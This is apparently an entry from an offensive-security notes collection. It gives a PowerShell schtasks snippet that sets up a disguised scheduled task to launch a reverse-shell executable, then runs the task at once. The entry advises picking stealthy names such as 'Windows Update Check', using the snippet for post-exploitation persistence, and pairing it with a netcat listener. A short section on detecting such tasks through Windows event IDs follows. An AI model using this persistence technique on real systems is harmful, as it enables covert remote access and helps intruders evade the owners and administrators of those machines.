---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
  - backdoor
validated: true
---

# Create-and-Run-Scheduled-Task-with-schtasks

## Code

```powershell
# Create the scheduled tasks to run once at 00.00
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
# Force run it now !
schtasks /run /tn "Device-Synchronize"
```

## Description

This PowerShell snippet creates a disguised scheduled task to run a reverse shell executable once at midnight and immediately forces its execution for testing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "Device-Synchronize" | Task name (customize for stealth) | "Windows Update Check" |
| C:\Temp\revshell.exe | Path to backdoor payload | C:\Windows\Temp\implant.exe |

## Usage

Execute in an elevated PowerShell session after uploading the payload. Ideal for quick persistence in post-exploitation; customize name and path to blend with system tasks. Follow with netcat listener if revshell.

## Detection

- Monitor Event ID 4698/4702 in Security logs for task creation.
- schtasks.exe spawning unusual processes or paths.
- Anomalous tasks in Task Scheduler with external TR paths.

## Related

- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
- [[commands/schtasks-create-task-once]]
